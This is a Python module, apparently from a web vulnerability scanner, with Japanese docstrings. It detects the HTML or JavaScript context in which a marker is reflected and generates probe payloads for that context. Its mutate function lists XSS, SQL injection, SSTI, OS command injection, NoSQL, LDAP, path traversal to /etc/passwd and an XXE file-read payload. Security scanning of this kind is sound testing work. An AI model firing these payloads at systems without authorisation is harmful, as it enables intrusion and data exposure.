"""反射文脈に応じた決定論的ペイロード変異。

このモジュールはブラウザやネットワーク状態に依存しない純粋ロジックだけを
持つ。スキャナ側は marker probe の応答本文を渡し、ここで文脈分類と追加
payload の合成だけを行う。
"""
from __future__ import annotations

import itertools
import re


SPECIAL_CHARS = "<>\"'`/();={}|&$"
_URL_ATTRS = {"href", "src", "action", "formaction", "xlink:href", "data", "poster"}
_MARKER_COUNTER = itertools.count(1)


def make_marker() -> str:
    """特殊文字を含まない一意な evolution probe 用 marker を返す。"""
    return f"wscanEVO{next(_MARKER_COUNTER)}"


def make_char_probe(marker: str) -> str:
    """marker 直後にフィルタ観測用の特殊文字列を付けた probe を返す。"""
    return marker + SPECIAL_CHARS


def surviving_chars(response: str, marker: str) -> set[str]:
    """marker 直後に raw のまま残った特殊文字集合を返す。

    ``&lt;`` や ``&#x27;`` のような HTML エンティティは、raw な制御文字として
    は実行文脈を壊せないため「生存していない」と判定する。
    """
    if not response or not marker:
        return set()

    survivors: set[str] = set()
    entity_by_char = {
        "<": re.compile(r"&(lt|#0*60|#x0*3c);", re.IGNORECASE),
        ">": re.compile(r"&(gt|#0*62|#x0*3e);", re.IGNORECASE),
        '"': re.compile(r"&(quot|#0*34|#x0*22);", re.IGNORECASE),
        "'": re.compile(r"&(apos|#0*39|#x0*27);", re.IGNORECASE),
        "&": re.compile(r"&(amp|#0*38|#x0*26);", re.IGNORECASE),
    }
    start = 0
    while True:
        idx = response.find(marker, start)
        if idx == -1:
            break
        pos = idx + len(marker)
        for expected in SPECIAL_CHARS:
            if pos >= len(response):
                break
            entity_re = entity_by_char.get(expected)
            if entity_re:
                m = entity_re.match(response, pos)
                if m:
                    pos = m.end()
                    continue
            if response[pos] == expected:
                survivors.add(expected)
                pos += 1
                continue
        start = idx + len(marker)
    return survivors


def detect_context(response: str, marker: str) -> dict:
    """marker の反射位置から HTML/JS 文脈を分類する。"""
    idx = response.find(marker) if response and marker else -1
    if idx == -1:
        return {}

    before = response[:idx]
    lower_before = before.lower()
    if lower_before.rfind("<!--") > lower_before.rfind("-->"):
        return {"context": "html_comment", "index": idx}

    in_tag = _open_tag_start(response, idx)
    if in_tag != -1:
        attr_name, quote = _owning_attr(response, in_tag, idx)
        if attr_name in _URL_ATTRS:
            return {
                "context": "url_attribute",
                "attribute": attr_name,
                "quote": quote,
                "index": idx,
            }
        if quote == '"':
            ctx = "double_quoted_attr"
        elif quote == "'":
            ctx = "single_quoted_attr"
        else:
            ctx = "unquoted_attr"
        return {"context": ctx, "attribute": attr_name, "quote": quote, "index": idx}

    script_start = lower_before.rfind("<script")
    script_end = lower_before.rfind("</script")
    if script_start != -1 and script_start > script_end:
        tag_end = response.find(">", script_start)
        if tag_end != -1 and tag_end < idx:
            quote = _script_string_quote(response[tag_end + 1:idx])
            if quote == "'":
                return {"context": "script_string_single", "quote": "'", "index": idx}
            if quote == '"':
                return {"context": "script_string_double", "quote": '"', "index": idx}
            return {"context": "script_block", "index": idx}

    return {"context": "html_text", "index": idx}


def mutate(
    check_type: str,
    *,
    context: dict,
    surviving: set[str],
    marker: str,
) -> list[str]:
    """check_type と文脈情報から追加投入する候補 payload を返す。"""
    check = (check_type or "").lower()
    if check in {"xss", "dom_xss"}:
        return _dedupe(_mutate_xss(context or {}, surviving or set()))
    if check == "sqli":
        return _dedupe(
            [
                "' OR '1'='1",
                '" OR "1"="1',
                ") OR (1=1",
                " OR 1=1-- -",
                "')) OR 1=1-- -",
                "1 OR 1=1",
                "' OR SLEEP(3)-- -",
                "\" OR SLEEP(3)-- -",
                "'; WAITFOR DELAY '0:0:3'--",
            ]
        )
    if check == "ssti":
        return _dedupe(["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}", "@(7*7)"])
    if check == "os":
        return _dedupe(
            [
                f"; echo {marker}",
                f"| echo {marker}",
                f"$(echo {marker})",
                f"`echo {marker}`",
                f";${{IFS}}echo${{IFS}}{marker}",
                f"& echo {marker}",
            ]
        )
    if check == "nosql":
        return _dedupe(['{"$ne":""}', '{"$gt":""}', '{"$regex":".*"}', '{"$ne":null}'])
    if check == "ldap":
        return _dedupe(["*", "*)(uid=*", "*)(|(uid=*))", "admin*"])
    if check == "path_traversal":
        return _dedupe(
            [
                "../../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "....//....//etc/passwd",
                "..\\..\\..\\windows\\win.ini",
            ]
        )
    if check == "xxe":
        return _dedupe(
            [
                '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'
            ]
        )
    return []


def _mutate_xss(context: dict, surviving: set[str]) -> list[str]:
    ctx = context.get("context", "html_text")
    out: list[str] = []

    if ctx == "html_text":
        if _has(surviving, "<>=()"):
            out.extend(["<svg onload=alert(1)>", "<img src=x onerror=alert(1)>"])
    elif ctx == "double_quoted_attr":
        if _has(surviving, '"'):
            if _has(surviving, '<>=()'):
                out.append('"><svg onload=alert(1)>')
            if _has(surviving, '=()'):
                out.append('" onmouseover=alert(1) x="')
    elif ctx == "single_quoted_attr":
        if _has(surviving, "'"):
            if _has(surviving, '<>=()'):
                out.append("'><svg onload=alert(1)>")
            if _has(surviving, '=()'):
                out.append("' onmouseover=alert(1) x='")
    elif ctx == "unquoted_attr":
        if _has(surviving, '=()'):
            out.append(" onmouseover=alert(1) ")
    elif ctx == "url_attribute":
        if _has(surviving, "()") or not surviving:
            out.append("javascript:alert(1)")
    elif ctx == "script_string_single":
        if _has(surviving, "';()/"):
            out.append("';alert(1);//")
        if _has(surviving, "'<>/=()"):
            out.append("'</script><svg onload=alert(1)>")
    elif ctx == "script_string_double":
        if _has(surviving, '";()/'):
            out.append('";alert(1);//')
        if _has(surviving, '"<>/=()'):
            out.append('"</script><svg onload=alert(1)>')
    elif ctx == "script_block":
        if _has(surviving, "()/"):
            out.append("alert(1)//")
    return out


def _open_tag_start(response: str, idx: int) -> int:
    lt = response.rfind("<", 0, idx)
    gt = response.rfind(">", 0, idx)
    if lt == -1 or (gt != -1 and gt > lt):
        return -1
    return lt


def _owning_attr(response: str, tag_start: int, idx: int) -> tuple[str, str]:
    seg = response[tag_start:idx]
    quote = ""
    open_quote_pos = -1
    current_quote = ""
    for pos, ch in enumerate(seg):
        if current_quote:
            if ch == current_quote:
                current_quote = ""
            continue
        if ch in {"'", '"'}:
            current_quote = ch
            quote = ch
            open_quote_pos = pos
    if current_quote:
        head = seg[:open_quote_pos]
        m = re.search(r"([A-Za-z_:][-A-Za-z0-9_:.]*)\s*=\s*$", head)
        return (m.group(1).lower() if m else "", current_quote)

    tail = seg.rsplit(None, 1)[-1]
    m = re.search(r"([A-Za-z_:][-A-Za-z0-9_:.]*)\s*=\s*[^'\"\s<>]*$", tail)
    if m:
        return (m.group(1).lower(), "")
    return ("", "")


def _script_string_quote(script_prefix: str) -> str:
    quote = ""
    escaped = False
    line_comment = False
    block_comment = False
    for i, ch in enumerate(script_prefix):
        nxt = script_prefix[i + 1] if i + 1 < len(script_prefix) else ""
        if line_comment:
            if ch in "\r\n":
                line_comment = False
            continue
        if block_comment:
            if ch == "*" and nxt == "/":
                block_comment = False
            continue
        if quote:
            if escaped:
                escaped = False
            elif ch == "\\":
                escaped = True
            elif ch == quote:
                quote = ""
            continue
        if ch == "/" and nxt == "/":
            line_comment = True
        elif ch == "/" and nxt == "*":
            block_comment = True
        elif ch in {"'", '"'}:
            quote = ch
    return quote


def _has(chars: set[str], required: str) -> bool:
    return all(ch in chars for ch in required)


def _dedupe(payloads: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for payload in payloads:
        if payload in seen:
            continue
        seen.add(payload)
        out.append(payload)
    return out
